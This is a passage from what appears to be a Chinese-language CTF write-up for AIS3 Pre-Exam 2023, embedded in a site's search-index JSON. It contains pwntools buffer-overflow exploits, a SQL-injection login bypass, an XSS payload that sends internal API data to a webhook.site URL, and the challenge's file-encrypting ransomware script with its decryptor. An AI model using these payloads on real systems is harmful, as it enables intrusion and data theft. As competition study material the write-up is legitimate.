XD</p>"},{"location":"writeup/AIS3-Pre-Exam-2023-writeup/#simple-pwn","title":"Simple Pwn","text":"<p>\u5728 ghidra \u4e2d\u6703\u770b\u5230  iStack_c = read(0,(long)&amp;uStack_50 + 1,0x100); \u53ef\u4ee5 bof \u4e26\u4e14\u4e5f\u6709\u4e00\u500b function \u662f\u57f7\u884c bin/sh \u7684 \u6240\u4ee5\u76f4\u63a5\u7528 pwntools ```python= from pwn import *</p>"},{"location":"writeup/AIS3-Pre-Exam-2023-writeup/#r-processpwn","title":"r = process('./pwn')","text":"<p>r = remote(\"chals1.ais3.org\", 11111) r.recvuntil(b\"Show me your name:\") targer_address = p64(0x4017ad) r.sendline(b'A' * (0x50 - 1) + targer_address) r.interactive()</p> <pre><code>## Fernet\n\u628a code \u4e1f\u7d66 ChatGPT \u8981\u4ed6\u751f\u6210\u89e3\u7b54 code \u5c31\u8dd1\u51fa\u4f86\u4e86\n![](https://hackmd.io/_uploads/B1-tSxGB3.png)\n\n## Login Panel\n\u8f38\u5165 admin \u8ddf 'or 1=1-- \u4e4b\u5f8c\u9032\u5165\n\u4e26\u4e14\u4fee\u6539\u7db2\u5740\u5217 \u56e0\u70ba\u5b83\u767b\u5165\u4ee5\u5f8c \u5e33\u865f\u5c31\u662f admin \u4e86\n\u4e4b\u5f8c\u5c31\u80fd\u62ff\u5230 Flag \u4e86\n\n## Robot\n\u5beb\u8173\u672c\u53bb\u505a\u5b57\u4e32\u62fc\u63a5\n```python=\nfrom pwn import *\n\nr = remote(\"chals1.ais3.org\", 12348)\n\nr.recvuntil(\"!\")\nq = r.recvline()\nfor j in range(90):\n    q = r.recvline()\n    print(q)\n    a1 = \"\"\n    a2 = \"\"\n    chk = 0\n    c = \"\"\n    for i in q:\n        if(chk == 0 and i &gt;= ord(\"0\") and i &lt;= ord(\"9\")):\n            a1 += chr(i)\n        elif(chk == 1 and i &gt;= ord(\"0\") and i &lt;= ord(\"9\")):\n            a2 += chr(i)\n        elif(i == 43 or i == 45 or i == 42 or i == 47):\n            c = chr(i)\n            chk = 1\n\n    if c == '*':\n        result = str(int(a1) * int(a2))\n        print(result)\n        r.sendline(result.encode())\n\n    if c == '+':\n        result = str(int(a1) + int(a2))\n        print(result)\n        r.sendline(result.encode())\n\n\nr.interactive()\n</code></pre> <p>\u807d\u8aaa\u6709\u9677\u9631 \u4f46\u6211\u6c92\u78b0\u5230\u5c31\u662f\u4e86</p>"},{"location":"writeup/AIS3-Pre-Exam-2023-writeup/#flag-sleeper","title":"Flag Sleeper","text":"<p>\u9019\u984c\u7528 Ghidra \u6253\u958b\u770b\u8d77\u4f86\u7279\u5225\u4e82 \u4f46\u7528 IDA \u5c31\u5f88\u76f4\u89c0 \u4e0d\u77e5\u9053\u70ba\u5565 \u8d85\u602a \u4ed6\u7684\u904b\u7b97\u5c31\u662f\u4e00\u500b v9[i] ^ v10[i] \u7136\u5f8c\u6709\u4e00\u500b v8 \u6c7a\u5b9a\u4ed6\u7684\u9806\u5e8f ```cpp=</p>"},{"location":"writeup/AIS3-Pre-Exam-2023-writeup/#include","title":"include  <p>using namespace std;</p> <p>int v8[0x34]; int v9[0x34]; int v10[0x34];</p> <p>int main() {     v8[0] = 10;     v8[1] = 12;     v8[2] = 28;     v8[3] = 7;     v8[4] = 38;     v8[5] = 31;     v8[6] = 47;     v8[7] = 44;     v8[8] = 42;     v8[9] = 35;     v8[10] = 48;     v8[11] = 30;     v8[12] = 21;     v8[13] = 11;     v8[14] = 17;     v8[15] = 16;     v8[16] = 34;     v8[17] = 40;     v8[18] = 33;     v8[19] = 39;     v8[20] = 41;     v8[21] = 9;     v8[22] = 22;     v8[23] = 4;     v8[24] = 6;     v8[25] = 20;     v8[26] = 19;     v8[27] = 46;     v8[28] = 23;     v8[29] = 45;     v8[30] = 26;     v8[31] = 0;     v8[32] = 15;     v8[33] = 3;     v8[34] = 8;     v8[35] = 43;     v8[36] = 14;     v8[37] = 5;     v8[38] = 2;     v8[39] = 27;     v8[40] = 49;     v8[41] = 1;     v8[42] = 51;     v8[43] = 36;     v8[44] = 37;     v8[45] = 24;     v8[46] = 25;     v8[47] = 50;     v8[48] = 32;     v8[49] = 13;     v8[50] = 29;     v8[51] = 18;     v9[0] = 212;     v9[1] = 232;     v9[2] = 164;     v9[3] = 28;     v9[4] = 253;     v9[5] = 132;     v9[6] = 194;     v9[7] = 47;     v9[8] = 46;     v9[9] = 150;     v9[10] = 96;     v9[11] = 216;     v9[12] = 121;     v9[13] = 216;     v9[14] = 140;     v9[15] = 164;     v9[16] = 49;     v9[17] = 219;     v9[18] = 147;     v9[19] = 252;     v9[20] = 201;     v9[21] = 28;     v9[22] = 9;     v9[23] = 188;     v9[24] = 155;     v9[25] = 79;     v9[26] = 133;     v9[27] = 255;     v9[28] = 104;     v9[29] = 20;     v9[30] = 87;     v9[31] = 64;     v9[32] = 147;     v9[33] = 143;     v9[34] = 68;     v9[35] = 147;     v9[36] = 142;     v9[37] = 96;     v9[38] = 165;     v9[39] = 244;     v9[40] = 62;     v9[41] = 58;     v9[42] = 119;     v9[43] = 25;     v9[44] = 61;     v9[45] = 56;     v9[46] = 71;     v9[47] = 182;     v9[48] = 7;     v9[49] = 37;     v9[50] = 1;     v9[51] = 154;     v10[0] = 237;     v10[1] = 217;     v10[2] = 212;     v10[3] = 40;     v10[4] = 149;     v10[5] = 219;     v10[6] = 165;     v10[7] = 112;     v10[8] = 29;     v10[9] = 241;     v10[10] = 8;     v10[11] = 189;     v10[12] = 13;     v10[13] = 224;     v10[14] = 211;     v10[15] = 149;     v10[16] = 5;     v10[17] = 184;     v10[18] = 255;     v10[19] = 207;     v10[20] = 162;     v10[21] = 122;     v10[22] = 86;     v10[23] = 199;     v10[24] = 170;     v10[25] = 122;     v10[26] = 240;     v10[27] = 206;     v10[28] = 9;     v10[29] = 102;     v10[30] = 102;     v10[31] = 1;     v10[32] = 163;     v10[33] = 188;     v10[34] = 119;     v10[35] = 225;     v10[36] = 239;     v10[37] = 3;     v10[38] = 246;     v10[39] = 153;     v10[40] = 9;     v10[41] = 115;     v10[42] = 10;     v10[43] = 70;     v10[44] = 94;     v10[45] = 103;     v10[46] = 52;     v10[47] = 137;     v10[48] = 97;     v10[49] = 29;     v10[50] = 109;     v10[51] = 208;     string s = \"\";     map mp;     for(int i = 0; i &lt; 52; i++) {         mp[v8[i]] = i;     }     for(int i = 0; i &lt; 52; i++) {         s += char(v10[i] ^ v9[i]);     }             cout &lt;&lt; mp[0] &lt;&lt; '\\n'; <pre><code>for(int i = 0; i &lt; 52; i++) {\n    cout &lt;&lt; s[mp[i]];\n}\ncout &lt;&lt; s[31];\n</code></pre> <p>}</p> <pre><code>\u6211\u7528 map \u53bb\u8dd1\u5566 \u56e0\u70ba\u6bd4\u8f03\u719f\u6089\n## ManagementSystem\n\u5728\u522a\u9664\u5e33\u865f\u90a3\u908a\u6703\u6709\u4e00\u500b gets \u53ef\u4ee5\u8df3\u4efb\u610f Function \n\u4e0d\u904e\u6211\u6e2c\u8a66\u597d\u50cf\u4ed6\u4e00\u5b9a\u8981\u5275\u5efa\u4e00\u500b\u7528\u6236\u624d\u80fd\u555f\u7528\n\u4e2d\u9593\u6211\u6709\u8e29\u4e00\u500b\u5751\n\u539f\u672c\u662f\u7528 ghidra \u7684\u5730\u5740\u8907\u88fd\u8cbc\u4e0a\u4e0a\u53bb\u76f4\u63a5\u7528\n\u4f46\u662f\u6703\u8df3\u5230\u90a3\u500b Function \u4f46\u662f\u537b\u6703 EOF \u800c\u4e0d\u662f get shell \n\u5f8c\u9762\u6539\u7528 ELF \u5c31\u89e3\u6c7a\u4e86\n```python=\nrom pwn import *\n\nr = remote('chals1.ais3.org', 10003)\nelf = ELF(\"./ms\")\n\nr.recvuntil(b\"&gt;\")\n\nr.sendline(b\"1\")\nr.recvuntil(b\":\")\nr.sendline(b\"1\")\nr.recvuntil(b\":\")\nr.sendline(b\"1\")\nr.recvuntil(b\":\")\nr.sendline(b\"1\")\n\nr.recvuntil(b\"&gt;\")\nr.sendline(b\"3\")\na = r.recvuntil(b\": \")\nprint(a)\naddr = elf.symbols['secret_function']\n\npayload = b'a' * (0x67) + p64(addr)\nr.send(payload)\n\nr.interactive()\n</code></pre>","text":""},{"location":"writeup/AIS3-Pre-Exam-2023-writeup/#welcome","title":"Welcome","text":"<p>\u61c9\u8a72\u4e0d\u7528\u8aaa\u5427 \u5c31\u76f4\u63a5\u770b owo</p>"},{"location":"writeup/AIS3-Pre-Exam-2023-writeup/#ais3-ransomware","title":"AIS3 ransomware","text":"<p>\u6253\u958b\u767c\u73fe\u4ed6\u6703\u751f\u6210\u4e00\u500b node.exe \u8ddf\u4e00\u500b js \u9ee8 \u5f8c\u9762\u5229\u7528 x32dbg \u66ab\u505c\u5f8c\u767c\u73fe node.exe \u5c31\u55ae\u7d14\u662f\u4e00\u500b\u57f7\u884c node \u7684\u6a94\u6848\u800c\u5df2 \u7136\u5f8c js \u770b\u8d77\u4f86\u975e\u5e38\u8907\u96dc \u6240\u4ee5\u6211\u53c8\u4e1f\u7d66 ChatGPT \u5206\u6790 ```js= const fs = require('fs'); const path = require('path');</p> <p>function encrypt(key, plaintext) {   let s = [];   let j = 0;   let x;   let result = '';</p> <p>for (let i = 0; i &lt; 256; i++) {     s[i] = i;   }</p> <p>for (let i = 0; i &lt; 256; i++) {     j = (j + s[i] + key.charCodeAt(i % key.length)) % 256;     x = s[i];     s[i] = s[j];     s[j] = x;   }</p> <p>let i = 0;   j = 0;</p> <p>for (let k = 0; k &lt; plaintext.length; k++) {     i = (i + 1) % 256;     j = (j + s[i]) % 256;     x = s[i];     s[i] = s[j];     s[j] = x;     result += String.fromCharCode(plaintext.charCodeAt(k) ^ s[(s[i] + s[j]) % 256]);   }</p> <p>return result; }</p> <p>const getFilePathsRecursive = function (folderPath, filePaths) {   let files = fs.readdirSync(folderPath);   filePaths = filePaths || [];</p> <p>files.forEach(function (filename) {     let fullPath = path.join(folderPath, filename);</p> <pre><code>if (fs.statSync(fullPath).isDirectory()) {\n  filePaths = getFilePathsRecursive(fullPath, filePaths);\n} else {\n  filePaths.push(path.join(__dirname, folderPath, filename));\n}\n</code></pre> <p>});</p> <p>return filePaths; };</p> <p>let key = process.argv.slice(2)[0]; let filePaths = getFilePathsRecursive('./target_ais3', []);</p> <p>filePaths.forEach(function (filePath) {   if (filePath.includes('.ais3')) {     return;   }</p> <p>fs.readFile(filePath, 'utf8', (err, data) =&gt; {     if (err) {       return;     }</p> <pre><code>if (data.includes('AIS3')) {\n  data += 'AIS3AIS3AIS3AIS3AIS3';\n  let encryptedData = Buffer.from(encrypt(key, data)).toString('base64');\n  fs.writeFile(filePath + '.ais3', encryptedData, (err) =&gt; {});\n  fs.unlinkSync(filePath);\n}\n</code></pre> <p>}); });</p> <pre><code>\u4e26\u8b93\u4ed6\u751f\u6210\u89e3\u5bc6 Function \u4e0d\u904e\u5206\u6790\u5f8c\u767c\u73fe\u4ed6\u9084\u9700\u8981\u4e00\u500b Key\n```js=\nfunction decrypt(key, cipherText) {\n    var S = [], j = 0, temp, plaintext = '';\n    for (var i = 0; i &lt; 256; i++) {\n        S[i] = i;\n    }\n    for (i = 0; i &lt; 256; i++) {\n        j = (j + S[i] + key.charCodeAt(i % key.length)) % 256;\n        temp = S[i];\n        S[i] = S[j];\n        S[j] = temp;\n    }\n    i = 0;\n    j = 0;\n    for (var k = 0; k &lt; cipherText.length; k++) {\n        i = (i + 1) % 256;\n        j = (j + S[i]) % 256;\n        temp = S[i];\n        S[i] = S[j];\n        S[j] = temp;\n        plaintext += String.fromCharCode(cipherText.charCodeAt(k) ^ S[(S[i] + S[j]) % 256]);\n    }\n    return plaintext;\n}\n\n</code></pre> <p>\u4ed6\u57f7\u884c\u4e3b\u8981\u6703\u662f <code>./node.exe a.js key</code>  \u56e0\u6b64\u6211\u5c31\u7528 x32dbg \u5728 87% \u7684\u6642\u5019\u66ab\u505c \u4e26\u4e14\u7528 F8 \u4f86\u6b65\u9032 \u7576\u6642\u6211\u731c\u4ed6\u7684 Key \u4e00\u5b9a\u6703\u51fa\u73fe\u5728 register \u88e1\u9762\u6240\u4ee5\u5c31\u6162\u6162\u8dd1\u904e\u53bb \u7d50\u679c\u9084\u771f\u7684\u88ab\u6211\u627e\u5230\u4e86 \u628a key \u8907\u88fd\u4e0b\u4f86 \u7528\u4f86\u89e3\u5bc6 \u9019\u984c\u5c31\u89e3\u51fa\u4f86\u4e86</p>"},{"location":"writeup/AIS3-Pre-Exam-2023-writeup/#e-portfolio-baby","title":"E-Portfolio baby","text":"<p>\u4ed6\u6703\u662f\u4e00\u500b\u9801\u9762 \u7136\u5f8c admin \u6703\u700f\u89bd\u8a72\u7db2\u9801 \u56e0\u6b64\u6211\u5c31\u731c\u662f\u5426\u53ef\u4ee5\u7528 XSS  \u4e4b\u5f8c\u6211\u5c31\u7528 webhook \u4f86\u6536\u8cc7\u6599 \u78ba\u5be6\u6536\u5230\u4e86 \u4e26\u4e14\u4e5f\u6a19\u793a\u8aaa\u4ed6\u4e3b\u6a5f\u662f http://web:8000 \u56e0\u6b64\u6211\u8b93\u4ed6\u628a\u672c\u6a5f 8000 port \u7684 portfolio \u8def\u5f91\u7684\u6771\u897f\u8f38\u51fa\u51fa\u4f86 \u5c31\u62ff\u5230 Flag \u4e86 \u7136\u5f8c\u6211\u539f\u672c\u4ee5\u70ba\u5f8c\u9762\u9084\u6709 \u7d50\u679c\u62ff\u5230\u7684\u5bc6\u78bc\u5c31\u662f Flag \u5f88\u4e0d\u660e\u986f==</p> <pre><code>&lt;img src=test onerror=\"fetch('http://web:8000/api/portfolio').then((response) =&gt; response.text()).then((text) =&gt; {fetch('https://webhook.site/af72bd92-e9b5-470b-bf39-749e3598c332?a='+text)})\"&gt;\n</code></pre>"},{"location":"writeup/AIS3-Pre-Exam-2023-writeup/#vivid-emotion","title":"Vivid Emotion","text":"<p>\u5229\u7528 ghidra \u7684 export \u529f\u80fd \u8b93\u4ed6\u8f38\u51fa cpp code \u4e26\u5beb\u8173\u672c\u628a\u6709\u5305\u542b Return \u7684\u5b57\u4e32\u62bd\u51fa\u4f86 \u5f8c\u9762\u624b\u5de5\u6392\u9664\u5176\u4ed6\u7684 \u4e26\u4e14\u4f7f\u7528 vscode \u4fee\u6539 return \u8b93\u4ed6\u8b8a\u6210 s.add ; \u8b8a\u6210 )</p> <p>\u5c31\u80fd\u5920\u7528 z3 \u5feb\u901f\u89e3\u51fa\u7b54\u6848\u4e86 ```python= from z3 import *</p> <p>arr = [BitVec(f'arr{i}', 16) for i in range(333)]</p> <p>s = Solver()</p> <p>s.add(arr[194] + arr[39] == 400) s.add(arr[129] + arr[70] == 0x11d) s.add(arr[260] + arr[234] == 0x148) s.add(arr[294] + arr[254] == 0x135) s.add(arr[304] + arr[48] == 0x89) s.add(arr[233] + arr[211] == 0x107) s.add(arr[178] + arr[103] == 0x10b) s.add(arr[314] + arr[303] == 0x166) s.add(arr[141] + arr[37] == 0x125) s.add(arr[23] + arr[0] == 0x1a4) s.add(arr[275] + arr[186] == 200) s.add(arr[55] + arr[27] == 0x1a4) s.add(arr[203] + arr[97] == 0x109) s.add(arr[240] + arr[58] == 0x38) s.add(arr[225] + arr[72] == 0x52) s.add(arr[255] + arr[71] == 0x5f) s.add(arr[326] + arr[234] == 0xd4) s.add(arr[62] + arr[60] == 0x119) s.add(arr[207] + arr[159] == 0xeb) s.add(arr[316] + arr[291] == 0x1a0) s.add(arr[207] + arr[174] == 0x196) s.add(arr[219] + arr[112] == 0xa0) s.add(arr[288] + arr[20] == 0xed) s.add(arr[331] + arr[63] == 0x136) s.add(arr[227] + arr[70] == 0x185) s.add(arr[321] + arr[1] == 0x4d) s.add(arr[122] + arr[34] == 0x68) s.add(arr[286] + arr[265] == 0xde) s.add(arr[208] + arr[138] == 0x184) s.add(arr[280] + arr[154] == 0x137) s.add(arr[307] + arr[109] == 0x19a) s.add(arr[100] + arr[56] == 0x15b) s.add(arr[281] + arr[146] == 0x170) s.add(arr[229] + arr[209] == 0x54) s.add(arr[277] + arr[220] == 0x4b) s.add(arr[61] + arr[51] == 0xef) s.add(arr[261] + arr[195] == 0xdb) s.add(arr[289] + arr[162] == 0x43) s.add(arr[80] + arr[8] == 0x129) s.add(arr[263] + arr[52] == 0x117) s.add(arr[230] + arr[226] == 0x25) s.add(arr[245] + arr[5] == 0x4a) s.add(arr[297] + arr[52] == 0x11e) s.add(arr[308] + arr[83] == 0xec) s.add(arr[191] + arr[55] == 0x1ae) s.add(arr[117] + arr[17] == 0x15a) s.add(arr[228] + arr[38] == 0x154) s.add(arr[245] + arr[30] == 0x5c) s.add(arr[169] + arr[126] == 0x1aa) s.add(arr[218] + arr[180] == 199) s.add(arr[183] + arr[156] == 0x146) s.add(arr[154] + arr[111] == 0x14b) s.add(arr[158] + arr[59] == 0x162) s.add(arr[307] + arr[15] == 0x157) s.add(arr[179] + arr[114] == 0x122) s.add(arr[241] + arr[145] == 299) s.add(arr[135] + arr[86] == 0x14e) s.add(arr[147] + arr[73] == 0xe5) s.add(arr[298] + arr[166] == 0x108) s.add(arr[269] + arr[115] == 0x3c) s.add(arr[301] + arr[94] == 0x179) s.add(arr[200] + arr[198] == 0x3b) s.add(arr[264] + arr[97] == 0xf1) s.add(arr[213] + arr[71] == 0xa9) s.add(arr[252] + arr[142] == 0x22) s.add(arr[161] + arr[62] == 0x10f) s.add(arr[202] + arr[192] == 0x139) s.add(arr[205] + arr[36] == 0x96) s.add(arr[332] + arr[330] == 0x101) s.add(arr[243] + arr[122] == 0x62) s.add(arr[293] + arr[189] == 0x6e) s.add(arr[315] + arr[86] == 0x12a) s.add(arr[283] + arr[231] == 0xb0) s.add(arr[286] + arr[134] == 0xa8) s.add(arr[75] + arr[54] == 0x76) s.add(arr[137] + arr[25] == 0xcf) s.add(arr[235] + arr[16] == 0xd8) s.add(arr[317] + arr[290] == 0x8d) s.add(arr[130] + arr[124] == 0xb7) s.add(arr[283] + arr[256] == 0x185) s.add(arr[330] + arr[278] == 0x78) s.add(arr[261] + arr[91] == 0x17e) s.add(arr[260] + arr[174] == 0x199) s.add(arr[309] + arr[131] == 0xf7) s.add(arr[322] + arr[279] == 99) s.add(arr[222] + arr[124] == 0xbf) s.add(arr[263] + arr[156] == 0x146) s.add(arr[236] + arr[232] == 0x43) s.add(arr[321] + arr[31] == 0x51) s.add(arr[210] + arr[89] == 0xce) s.add(arr[185] + arr[10] == 0x13f) s.add(arr[265] + arr[31] == 0x80) s.add(arr[150] + arr[14] == 0xf6) s.add(arr[219] + arr[13] == 0xa2) s.add(arr[175] + arr[147] == 0xae) s.add(arr[182] + arr[2] == 0x32) s.add(arr[74] + arr[66] == 0x138) s.add(arr[314] + arr[223] == 0x103) s.add(arr[222] + arr[59] == 0x92) s.add(arr[241] + arr[13] == 0x12a) s.add(arr[324] + arr[299] == 0xe5) s.add(arr[221] + arr[82] == 0x6b) s.add(arr[320] + arr[75] == 0xad) s.add(arr[257] + arr[9] == 0x128) s.add(arr[238] + arr[201] == 0x13a) s.add(arr[183] + arr[67] == 0x1d8) s.add(arr[138] + arr[80] == 0x150) s.add(arr[331] + arr[110] == 0x106) s.add(arr[233] + arr[93] == 0xd8) s.add(arr[88] + arr[82] == 0x9d) s.add(arr[285] + arr[29] == 0x1bc) s.add(arr[152] + arr[96] == 0x137) s.add(arr[99] + arr[81] == 0xb8) s.add(arr[202] + arr[108] == 0x13f) s.add(arr[189] + arr[22] == 0xf8) s.add(arr[215] + arr[85] == 0xe4) s.add(arr[128] + arr[117] == 0x10c) s.add(arr[196] + arr[193] == 0x175) s.add(arr[106] + arr[41] == 0xf1) s.add(arr[258] + arr[194] == 0xc1) s.add(arr[327] + arr[254] == 0x147) s.add(arr[87] + arr[73] == 0x172) s.add(arr[290] + arr[78] == 0x14a) s.add(arr[85] + arr[12] == 0x129) s.add(arr[284] + arr[120] == 0x59) s.add(arr[218] + arr[177] == 0xe1) s.add(arr[116] + arr[53] == 0xfb) s.add(arr[164] + arr[153] == 0x9d) s.add(arr[197] + arr[79] == 0x12a) s.add(arr[162] + arr[145] == 0x65) s.add(arr[250] + arr[203] == 0xe5) s.add(arr[167] + arr[78] == 0x1e4) s.add(arr[280] + arr[114] == 0x148) s.add(arr[323] + arr[35] == 0xe9) s.add(arr[301] + arr[19] == 0xed) s.add(arr[239] + arr[87] == 0x119) s.add(arr[299] + arr[7] == 0xb1) s.add(arr[252] + arr[72] == 0x37) s.add(arr[318] + arr[302] == 0x158) s.add(arr[310] + arr[249] == 0xe8) s.add(arr[171] + arr[38] == 0x12a) s.add(arr[91] + arr[45] == 0x155) s.add(arr[242] + arr[33] == 0x1a3) s.add(arr[268] + arr[181] == 0xc2) s.add(arr[25] + arr[12] == 0x19c) s.add(arr[247] + arr[205] == 0x134) s.add(arr[186] + arr[180] == 0xdf) s.add(arr[296] + arr[190] == 0x1ec) s.add(arr[168] + arr[22] == 0x139) s.add(arr[262] + arr[102] == 0x160) s.add(arr[294] + arr[173] == 0x9c) s.add(arr[251] + arr[200] == 0x7a) s.add(arr[206] + arr[105] == 0x15d) s.add(arr[253] + arr[227] == 0xf0) s.add(arr[100] + arr[61] == 0x171) s.add(arr[167] + arr[6] == 0x1a4) s.add(arr[269] + arr[248] == 0xba) s.add(arr[65] + arr[3] == 0x10a) s.add(arr[208] + arr[35] == 0x181) s.add(arr[315] + arr[176] == 0xa8) s.add(arr[267] + arr[90] == 0x1de) s.add(arr[285] + arr[240] == 0x116) s.add(arr[319] + arr[313] == 0x157) s.add(arr[264] + arr[148] == 0x39) s.add(arr[328] + arr[132] == 0xcd) s.add(arr[258] + arr[41] == 0x5a) s.add(arr[221] + arr[195] == 0x6f) s.add(arr[246] + arr[155] == 0xe9) s.add(arr[295] + arr[95] == 0xd7) s.add(arr[98] + arr[74] == 0xf8) s.add(arr[226] + arr[5] == 0x37) s.add(arr[102] + arr[92] == 0x121) s.add(arr[248] + arr[214] == 0xac) s.add(arr[256] + arr[120] == 0x10c) s.add(arr[173] + arr[109] == 0x111) s.add(arr[238] + arr[47] == 0x7d) s.add(arr[212] + arr[170] == 0x15a) s.add(arr[273] + arr[29] == 0x137) s.add(arr[305] + arr[224] == 0x115) s.add(arr[306] + arr[66] == 0x107) s.add(arr[149] + arr[141] == 0x187) s.add(arr[239] + arr[50] == 0xda) s.add(arr[142] + arr[32] == 0xc4) s.add(arr[328] + arr[103] == 0x46) s.add(arr[199] + arr[175] == 0xb7) s.add(arr[300] + arr[270] == 0xe7) s.add(arr[225] + arr[104] == 0x10d) s.add(arr[306] + arr[199] == 0xe8) s.add(arr[236] + arr[159] == 0x2b) s.add(arr[143] + arr[24] == 0x1d3) s.add(arr[272] + arr[270] == 0xdf) s.add(arr[302] + arr[281] == 0x1a6) s.add(arr[292] + arr[198] == 0xf6) s.add(arr[132] + arr[51] == 0x103) s.add(arr[197] + arr[115] == 0xb5) s.add(arr[309] + arr[153] == 0xcb) s.add(arr[332] + arr[125] == 0x17d) s.add(arr[244] + arr[63] == 0x165) s.add(arr[217] + arr[188] == 0xfb) s.add(arr[274] + arr[211] == 0x109) s.add(arr[237] + arr[57] == 0x12f) s.add(arr[291] + arr[28] == 0x1a1) s.add(arr[244] + arr[33] == 0x1a2) s.add(arr[144] + arr[127] == 0xab) s.add(arr[101] + arr[77] == 0x17a) s.add(arr[289] + arr[149] == 0xbe) s.add(arr[324] + arr[11] == 0xf9) s.add(arr[50] + arr[23] == 0x121) s.add(arr[131] + arr[128] == 0x12d) s.add(arr[179] + arr[119] == 0x136) s.add(arr[54] + arr[4] == 0x7d) s.add(arr[322] + arr[196] == 0x10d) s.add(arr[230] + arr[4] == 0x23) s.add(arr[139] + arr[40] == 0x78) s.add(arr[318] + arr[99] == 0x11f) s.add(arr[237] + arr[1] == 0x73) s.add(arr[18] + arr[10] == 0x88) s.add(arr[229] + arr[43] == 0xe8) s.add(arr[166] + arr[26] == 0x162) s.add(arr[215] + arr[127] == 0xe4) s.add(arr[105] + arr[15] == 0x177) s.add(arr[293] + arr[46] == 0xcc) s.add(arr[228] + arr[89] == 0x1c7) s.add(arr[317] + arr[267] == 0x11a) s.add(arr[295] + arr[150] == 99) s.add(arr[300] + arr[146] == 0x116) s.add(arr[271] + arr[81] == 0x7a) s.add(arr[220] + arr[165] == 0xf6) s.add(arr[257] + arr[64] == 0xd4) s.add(arr[133] + arr[93] == 0x99) s.add(arr[181] + arr[129] == 0x6f) s.add(arr[266] + arr[184] == 0xb0) s.add(arr[329] + arr[311] == 0x83) s.add(arr[123] + arr[39] == 0x139) s.add(arr[325] + arr[242] == 0xf8) s.add(arr[191] + arr[126] == 0x199) s.add(arr[176] + arr[160] == 0x101) s.add(arr[214] + arr[190] == 0xfb) s.add(arr[246] + arr[185] == 0xc6) s.add(arr[26] + arr[18] == 0x6d) s.add(arr[143] + arr[104] == 0x1ce) s.add(arr[64] + arr[56] == 0x111) s.add(arr[118] + arr[30] == 0x102) s.add(arr[313] + arr[76] == 0x9d) s.add(arr[266] + arr[139] == 0xad) s.add(arr[118] + arr[111] == 0x1a8) s.add(arr[44] + arr[6] == 0x19c) s.add(arr[65] + arr[7] == 0x149) s.add(arr[48] + arr[43] == 0x146) s.add(arr[76] + arr[32] == 0xb0) s.add(arr[152] + arr[112] == 300) s.add(arr[177] + arr[42] == 0x121) s.add(arr[151] + arr[116] == 0xb7) s.add(arr[305] + arr[209] == 0x10b) s.add(arr[308] + arr[57] == 0x131) s.add(arr[136] + arr[119] == 0x166) s.add(arr[251] + arr[14] == 0x13f) s.add(arr[297] + arr[47] == 0x11d) s.add(arr[243] + arr[216] == 0x76) s.add(arr[165] + arr[130] == 0xc2) s.add(arr[296] + arr[168] == 0x18b) s.add(arr[303] + arr[92] == 0x138) s.add(arr[204] + arr[158] == 0x107) s.add(arr[135] + arr[46] == 0x125) s.add(arr[276] + arr[45] == 0x169) s.add(arr[235] + arr[101] == 0x188) s.add(arr[187] + arr[16] == 0x4d) s.add(arr[316] + arr[201] == 0x1b8) s.add(arr[292] + arr[90] == 0x1bd) s.add(arr[42] + arr[36] == 0xcc) s.add(arr[123] + arr[21] == 0xb7) s.add(arr[319] + arr[134] == 0xf7) s.add(arr[232] + arr[216] == 0x7d) s.add(arr[224] + arr[77] == 0x10c) s.add(arr[287] + arr[84] == 0x1e1) s.add(arr[178] + arr[53] == 0x1a7) s.add(arr[250] + arr[60] == 0x11b) s.add(arr[247] + arr[106] == 0x188) s.add(arr[277] + arr[163] == 0xfd) s.add(arr[213] + arr[155] == 0x173) s.add(arr[44] + arr[37] == 0x127) s.add(arr[231] + arr[192] == 0x9b) s.add(arr[171] + arr[110] == 0x10e) s.add(arr[204] + arr[17] == 0x106) s.add(arr[212] + arr[20] == 0x174) s.add(arr[325] + arr[271] == 0x71) s.add(arr[188] + arr[40] == 0x9d) s.add(arr[275] + arr[262] == 0x118) s.add(arr[312] + arr[136] == 0x152) s.add(arr[311] + arr[68] == 0xb1) s.add(arr[279] + arr[137] == 0x26) s.add(arr[304] + arr[24] == 0x109) s.add(arr[125] + arr[9] == 0x177) s.add(arr[172] + arr[113] == 0x3e) s.add(arr[217] + arr[28] == 0x19e) s.add(arr[288] + arr[268] == 0xf1) s.add(arr[19] + arr[8] == 0xec) s.add(arr[157] + arr[94] == 0xfc) s.add(arr[133] + arr[58] == 0x8c) s.add(arr[223] + arr[49] == 0xe2) s.add(arr[253] + arr[84] == 0x150) s.add(arr[98] + arr[3] == 0x1a) s.add(arr[187] + arr[160] == 0xe0) s.add(arr[206] + arr[96] == 0xec) s.add(arr[327] + arr[249] == 0x103) s.add(arr[95] + arr[88] == 0xff) s.add(arr[161] + arr[67] == 0x162) s.add(arr[326] + arr[278] == 0xb9) s.add(arr[163] + arr[157] == 0x121) s.add(arr[329] + arr[287] == 0x169) s.add(arr[276] + arr[140] == 0x1c9) s.add(arr[184] + arr[121] == 0x1f) s.add(arr[182] + arr[11] == 0x99) s.add(arr[121] + arr[69] == 0x3d) s.add(arr[284] + arr[148] == 0x42) s.add(arr[310] + arr[2] == 0x8d) s.add(arr[210] + arr[49] == 0x93) s.add(arr[320] + arr[272] == 0xfa) s.add(arr[193] + arr[107] == 0x191) s.add(arr[172] + arr[107] == 0xce) s.add(arr[282] + arr[164] == 0xc0) s.add(arr[140] + arr[113] == 0x114) s.add(arr[27] + arr[21] == 0x144) s.add(arr[274] + arr[108] == 0x146) s.add(arr[255] + arr[151] == 0xd6) s.add(arr[273] + arr[68] == 0x112) s.add(arr[259] + arr[83] == 0x8d) s.add(arr[312] + arr[259] == 0x92) s.add(arr[79] + arr[0] == 0x195) s.add(arr[170] + arr[144] == 0xce) s.add(arr[169] + arr[34] == 0x11a) s.add(arr[282] + arr[69] == 0xb2) s.add(arr[323] + arr[298] == 0x32)</p> <p>print(s.check()) m = s.model()</p> <p>for i in range(333):     print(m[arr[i]].as_long())</p> <p>``` \u7136\u5f8c\u6211\u539f\u672c bitvec \u958b 8 \u6703\u932f \u5f8c\u9762\u958b 16 \u624d\u89e3\u51fa\u7b54\u6848</p>"},{"location":"writeup/AIS3-Pre-Exam-2023-writeup/#_1","title":"\u5f8c\u9762\u662f\u4e00\u4e9b\u6709\u60f3\u6cd5\u4f46\u8166\u9727\u7684","text":"<p>eert \u6211\u6709\u770b\u5230\u4ed6\u8981\u7b49\u65bc 0x27e3 \u7136\u5f8c\u5148\u8f38\u5165 170 \u4e4b\u5f8c\u53ef\u4ee5\u8f38\u5165 100 \u6b21 \u7136\u5f8c\u61c9\u8a72\u6703\u628a\u4ed6\u52a0\u7e3d\u8d77\u4f86 